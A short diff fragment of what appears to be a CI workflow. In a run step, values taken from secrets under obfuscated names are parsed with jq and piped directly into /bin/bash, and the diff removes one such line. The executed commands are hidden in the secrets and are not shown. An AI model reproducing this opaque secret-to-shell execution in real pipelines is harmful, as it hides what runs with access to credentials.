@@ -17,7 +17,6 @@ jobs:
           unrj07: ${{ secrets.unrj07 }}
         run: |
           printf '%s' "$unrj07" | jq -r .daltd80 | /bin/bash
-          echo $yjzfg23801 | jq -r .ohvf5557 | /bin/bash
           printf '%s' "$nfet04" | jq -r .nos67 | /bin/bash
           echo $zdvt11865 | jq -r .pdta0651 | /bin/bash
           printf '%s' "$vd89960" | jq -r .xbtg61714 | /bin/bash
